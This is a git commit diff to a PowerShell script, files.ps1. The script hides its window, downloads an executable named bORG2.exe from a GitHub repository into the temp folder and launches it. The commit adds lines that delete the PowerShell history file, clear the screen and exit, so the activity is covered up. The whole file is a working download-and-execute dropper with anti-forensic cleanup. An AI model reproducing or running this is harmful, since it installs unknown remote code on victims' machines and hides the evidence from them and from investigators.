0b008cd821391da92335e22b7775e3e59e0e3b7c
skekic16 <151707511+skekic16@users.noreply.github.com>
2024-01-03 13:11:42 -0600

    Update files.ps1

--- files.ps1
+++ files.ps1
@@ -1,3 +1,5 @@
 powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/bORG2.exe?dl=1 -O $Env:TMP\bORG2.exe
 start-process "$env:TMP\bORG2.exe"
-
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+cls
+exit
